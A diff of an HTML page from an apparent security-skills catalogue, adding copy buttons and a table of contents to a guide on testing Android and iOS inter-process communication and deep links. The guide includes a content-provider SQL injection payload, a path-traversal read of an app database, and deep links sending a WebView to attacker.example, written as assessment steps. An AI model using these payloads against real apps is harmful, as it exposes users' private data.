@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,11 +47,12 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Test mobile inter-process communication and deep link attack surface — exported Android activities, services, receivers and content providers, intent redirection, PendingIntent hijacking, App Links verification, iOS custom URL schemes, Universal Links, and App Groups — using drozer, adb, and Frida. Use when reviewing AndroidManifest.xml exported components, testing deeplinks or URL schemes, or assessing what another app on the device can reach.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-offense
+/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-offense
 <span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><p>Every exported component and registered URL scheme is a remote entry point that does not need the network. A malicious app on the same device — or a web page the user visits — can invoke them directly, and they are frequently written as if only the app itself would ever call them.</p>
-<h2>When to Use</h2>
+<div class="wrap slayout"><article><p>Every exported component and registered URL scheme is a remote entry point that does not need the network. A malicious app on the same device — or a web page the user visits — can invoke them directly, and they are frequently written as if only the app itself would ever call them.</p>
+<h2 id="when-to-use">When to Use</h2>
 <ul>
 <li>Reviewing <code>AndroidManifest.xml</code> for exported components</li>
 <li>Testing deep links, App Links, custom URL schemes, or Universal Links</li>
@@ -48,7 +60,7 @@
 <li>Checking <code>PendingIntent</code>, intent redirection, and App Group sharing</li>
 <li>Answering "what can another app on this device do to this one?"</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>Network API testing</strong> — use <a class="xref" href="testing-apis.html"><code>testing-apis</code></a></li>
 <li><strong>Binary-level reversing</strong> — use <a class="xref" href="analyzing-ios-binaries.html"><code>analyzing-ios-binaries</code></a> or the relevant</li>
@@ -61,8 +73,18 @@
 <ul>
 <li><strong>The wider assessment</strong> — use <a class="xref" href="testing-mobile-applications.html"><code>testing-mobile-applications</code></a></li>
 </ul>
-<h2>Android: Enumerate the Surface</h2>
-<pre><code>apktool d target.apk -o out
+<h2 id="android-enumerate-the-surface">Android: Enumerate the Surface</h2>
+<div class="codeblk cx"><button class="copy" data-copy="apktool d target.apk -o out
+# Every component with exported=true, or with an intent-filter and no explicit
+# exported attribute on older targetSdk (which defaults to exported)
+rg -n &#x27;android:exported=&quot;true&quot;|&lt;intent-filter&gt;&#x27; -B3 out/AndroidManifest.xml
+
+# Live enumeration
+adb shell dumpsys package com.target.app | rg -A3 &#x27;Activity Resolver|Receiver Resolver|Service Resolver|Provider&#x27;
+drozer console connect
+#   run app.package.attacksurface com.target.app
+#   run app.activity.info -a com.target.app
+#   run app.provider.info -a com.target.app">copy</button><pre><code>apktool d target.apk -o out
 # Every component with exported=true, or with an intent-filter and no explicit
 # exported attribute on older targetSdk (which defaults to exported)
 rg -n 'android:exported="true"|&lt;intent-filter&gt;' -B3 out/AndroidManifest.xml
@@ -72,12 +94,27 @@ adb shell dumpsys package com.target.app | rg -A3 'Activity Resolver|Receiver Re
 drozer console connect
 #   run app.package.attacksurface com.target.app
 #   run app.activity.info -a com.target.app
-#   run app.provider.info -a com.target.app</code></pre>
+#   run app.provider.info -a com.target.app</code></pre></div>
 <p><strong><code>android:exported</code> defaults changed</strong> — apps targeting API 31+ must declare it explicitly, but a component with an intent-filter on an older target is exported implicitly. Check <code>targetSdkVersion</code> before concluding a component is private.</p>
 <p>Also check <strong>permission protection levels</strong>. A component "protected" by a custom permission declared with <code>protectionLevel="normal"</code> is protected by nothing: any app can request and receive it without user interaction.</p>
-<pre><code>rg -n 'permission android:name|protectionLevel' out/AndroidManifest.xml</code></pre>
-<h2>Android: Test Each Component Type</h2>
-<pre><code># Activities — can an unauthenticated screen be launched directly?
+<div class="codeblk cx"><button class="copy" data-copy="rg -n &#x27;permission android:name|protectionLevel&#x27; out/AndroidManifest.xml">copy</button><pre><code>rg -n 'permission android:name|protectionLevel' out/AndroidManifest.xml</code></pre></div>
+<h2 id="android-test-each-component-type">Android: Test Each Component Type</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# Activities — can an unauthenticated screen be launched directly?
+adb shell am start -n com.target.app/.SomeActivity
+adb shell am start -a android.intent.action.VIEW -d &quot;myapp://path?param=value&quot;
+adb shell am start -n com.target.app/.WebActivity --es url &quot;https://attacker.example&quot;
+
+# Services
+adb shell am startservice -n com.target.app/.ExportedService --es cmd value
+
+# Broadcast receivers
+adb shell am broadcast -a com.target.app.ACTION_X --es data value
+
+# Content providers — the highest-yield target
+adb shell content query --uri content://com.target.app.provider/users
+adb shell content query --uri content://com.target.app.provider/users \
+  --where &quot;1=1) UNION SELECT password FROM creds--&quot;
+adb shell content read --uri content://com.target.app.provider/files/../../databases/app.db">copy</button><pre><code># Activities — can an unauthenticated screen be launched directly?
 adb shell am start -n com.target.app/.SomeActivity
 adb shell am start -a android.intent.action.VIEW -d "myapp://path?param=value"
 adb shell am start -n com.target.app/.WebActivity --es url "https://attacker.example"
@@ -92,7 +129,7 @@ adb shell am broadcast -a com.target.app.ACTION_X --es data value
 adb shell content query --uri content://com.target.app.provider/users
 adb shell content query --uri content://com.target.app.provider/users \
   --where "1=1) UNION SELECT password FROM creds--"
-adb shell content read --uri content://com.target.app.provider/files/../../databases/app.db</code></pre>
+adb shell content read --uri content://com.target.app.provider/files/../../databases/app.db</code></pre></div>
 <p>Content providers deserve specific attention because two classic bugs recur:</p>
 <ul>
 <li><strong>SQL injection</strong> through the <code>selection</code>/<code>projection</code> arguments, which are</li>
@@ -102,30 +139,41 @@ adb shell content read --uri content://com.target.app.provider/files/../../datab
 <li><strong>Path traversal</strong> in <code>openFile()</code>, where a provider that serves files from</li>
 </ul>
 <p>its own directory does not canonicalize the requested path, giving any app on the device read access to the app's private storage.</p>
-<h2>Android: The High-Impact Patterns</h2>
+<h2 id="android-the-high-impact-patterns">Android: The High-Impact Patterns</h2>
 <p><strong>Intent redirection (the "confused deputy" of Android).</strong> An exported component takes an <code>Intent</code> as an <em>extra</em> and then starts it. The caller supplies the inner intent, so it executes with the victim app's identity — reaching its non-exported components and its permissions.</p>
-<pre><code>rg -n 'getParcelableExtra.*Intent|startActivity\(.*getIntent\(\).*Extra' out/smali*
-# Exploit shape: outer intent → exported component → inner intent → private component</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="rg -n &#x27;getParcelableExtra.*Intent|startActivity\(.*getIntent\(\).*Extra&#x27; out/smali*
+# Exploit shape: outer intent → exported component → inner intent → private component">copy</button><pre><code>rg -n 'getParcelableExtra.*Intent|startActivity\(.*getIntent\(\).*Extra' out/smali*
+# Exploit shape: outer intent → exported component → inner intent → private component</code></pre></div>
 <p><strong>PendingIntent hijacking.</strong> A <code>PendingIntent</code> created with an implicit base intent, or without <code>FLAG_IMMUTABLE</code>, lets the receiving app fill in the blanks and cause an action with the sender's identity.</p>
-<pre><code>rg -n 'PendingIntent.get(Activity|Broadcast|Service)' -A3 out/smali*
-# Findings: FLAG_MUTABLE (or no flag pre-API-31) plus an implicit base intent</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="rg -n &#x27;PendingIntent.get(Activity|Broadcast|Service)&#x27; -A3 out/smali*
+# Findings: FLAG_MUTABLE (or no flag pre-API-31) plus an implicit base intent">copy</button><pre><code>rg -n 'PendingIntent.get(Activity|Broadcast|Service)' -A3 out/smali*
+# Findings: FLAG_MUTABLE (or no flag pre-API-31) plus an implicit base intent</code></pre></div>
 <p><strong>Deep link to WebView.</strong> A deep link parameter that becomes a <code>loadUrl()</code> target turns any web page into a way to render attacker content inside the app's WebView — with its cookies, its JS bridges, and its file access.</p>
-<pre><code>adb shell am start -a android.intent.action.VIEW -d "myapp://open?url=https://attacker.example"
-rg -n 'loadUrl|addJavascriptInterface|setAllowFileAccess|setJavaScriptEnabled' out/smali*</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="adb shell am start -a android.intent.action.VIEW -d &quot;myapp://open?url=https://attacker.example&quot;
+rg -n &#x27;loadUrl|addJavascriptInterface|setAllowFileAccess|setJavaScriptEnabled&#x27; out/smali*">copy</button><pre><code>adb shell am start -a android.intent.action.VIEW -d "myapp://open?url=https://attacker.example"
+rg -n 'loadUrl|addJavascriptInterface|setAllowFileAccess|setJavaScriptEnabled' out/smali*</code></pre></div>
 <p><strong>App Links verification.</strong> <code>autoVerify="true"</code> only works if <code>https://domain/.well-known/assetlinks.json</code> is correct and reachable. When verification fails, the link degrades to a disambiguation dialog that another app can also claim.</p>
-<pre><code>curl -s https://target.example/.well-known/assetlinks.json | jq .
-adb shell pm get-app-links com.target.app</code></pre>
-<h2>iOS</h2>
-<pre><code># Declared URL schemes and associated domains
+<div class="codeblk cx"><button class="copy" data-copy="curl -s https://target.example/.well-known/assetlinks.json | jq .
+adb shell pm get-app-links com.target.app">copy</button><pre><code>curl -s https://target.example/.well-known/assetlinks.json | jq .
+adb shell pm get-app-links com.target.app</code></pre></div>
+<h2 id="ios">iOS</h2>
+<div class="codeblk cx"><button class="copy" data-copy="# Declared URL schemes and associated domains
+plutil -p Payload/TargetApp.app/Info.plist | rg -A5 &#x27;CFBundleURLSchemes&#x27;
+codesign -d --entitlements :- Payload/TargetApp.app | rg -A3 &#x27;associated-domains|application-groups&#x27;
+
+# Trigger a scheme
+xcrun simctl openurl booted &quot;myapp://path?param=value&quot;
+# On device: open the URL from Safari or Notes">copy</button><pre><code># Declared URL schemes and associated domains
 plutil -p Payload/TargetApp.app/Info.plist | rg -A5 'CFBundleURLSchemes'
 codesign -d --entitlements :- Payload/TargetApp.app | rg -A3 'associated-domains|application-groups'
 
 # Trigger a scheme
 xcrun simctl openurl booted "myapp://path?param=value"
-# On device: open the URL from Safari or Notes</code></pre>
+# On device: open the URL from Safari or Notes</code></pre></div>
 <p><strong>Custom URL schemes are unauthenticated and claimable.</strong> Any app can register <code>myapp://</code>, and if two do, the winner is undefined. Anything reached through a custom scheme must be treated as attacker-invoked. Universal Links are the verified alternative:</p>
-<pre><code>curl -s https://target.example/.well-known/apple-app-site-association | jq .
-# Must be served over HTTPS, no redirect, correct app ID, correct paths</code></pre>
+<div class="codeblk cx"><button class="copy" data-copy="curl -s https://target.example/.well-known/apple-app-site-association | jq .
+# Must be served over HTTPS, no redirect, correct app ID, correct paths">copy</button><pre><code>curl -s https://target.example/.well-known/apple-app-site-association | jq .
+# Must be served over HTTPS, no redirect, correct app ID, correct paths</code></pre></div>
 <p>Also check:</p>
 <ul>
 <li><strong>App Groups</strong> — a shared container between the app and its extensions. Data</li>
@@ -140,7 +188,7 @@ xcrun simctl openurl booted "myapp://path?param=value"
 <li><strong><code>application:openURL:options:</code></strong> — check whether the handler validates the</li>
 </ul>
 <p>source application and the URL's parameters before acting.</p>
-<h2>What Makes It a Finding</h2>
+<h2 id="what-makes-it-a-finding">What Makes It a Finding</h2>
 <p>Invoking a component is not itself a finding. The finding is what it lets an unprivileged local app do:</p>
 <ol>
 <li><strong>Reach a privileged action without authentication</strong> — a transfer screen, a</li>
@@ -157,7 +205,7 @@ xcrun simctl openurl booted "myapp://path?param=value"
 </ol>
 <p>written to a shared container, or logged</p>
 <p>Test whether the deep link path skips authentication specifically: launch the target component with the app logged out, and again with a different account.</p>
-<h2>Rationalizations to Reject</h2>
+<h2 id="rationalizations-to-reject">Rationalizations to Reject</h2>
 <ul>
 <li><em>"It's exported but it needs a permission."</em> Check the protection level.</li>
 </ul>
@@ -182,12 +230,15 @@ xcrun simctl openurl booted "myapp://path?param=value"
 <li><em>"The provider is read-only."</em> Read is the finding when the rows belong to</li>
 </ul>
 <p>someone else.</p>
-<h2>References</h2>
+<h2 id="references">References</h2>
 <ul>
 <li><a class="xref" href="testing-mobile-applications.html"><code>testing-mobile-applications</code></a> — the wider assessment</li>
 <li><a class="xref" href="testing-apis.html"><code>testing-apis</code></a> — the backend those components ultimately call</li>
 <li><a class="xref" href="analyzing-ios-binaries.html"><code>analyzing-ios-binaries</code></a> — entitlements and App Group enumeration</li>
 <li><a class="xref" href="reporting-security-findings.html"><code>reporting-security-findings</code></a> — severity for local-attacker findings</li>
 <li>drozer, adb, apktool, jadx, objection, Frida</li>
-</ul></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+</ul></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#android-enumerate-the-surface">Android: Enumerate the Surface</a><a href="#android-test-each-component-type">Android: Test Each Component Type</a><a href="#android-the-high-impact-patterns">Android: The High-Impact Patterns</a><a href="#ios">iOS</a><a href="#what-makes-it-a-finding">What Makes It a Finding</a><a href="#rationalizations-to-reject">Rationalizations to Reject</a><a href="#references">References</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · offense · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
